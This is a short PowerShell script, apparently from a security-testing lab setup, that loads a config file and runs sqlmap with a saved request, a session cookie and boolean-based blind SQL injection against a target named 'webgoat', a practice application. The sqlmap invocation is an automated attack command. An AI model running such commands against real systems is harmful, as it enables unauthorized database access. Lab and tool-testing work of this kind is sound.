# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "webgoat"
$sqlmap_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.sqlmap))
$output_dir = Join-Path $PSScriptRoot $config.output_raw

$jsessid = $config.targets.$target.jsessid
$cookie = "JSESSIONID={0}" -f $jsessid
$request1 = Join-Path $PSScriptRoot $config.targets.$target.request1


python $sqlmap_path -r "$request1" --cookie="$cookie" --technique=B --level 3 --batch --output-dir="$output_dir\webgoat"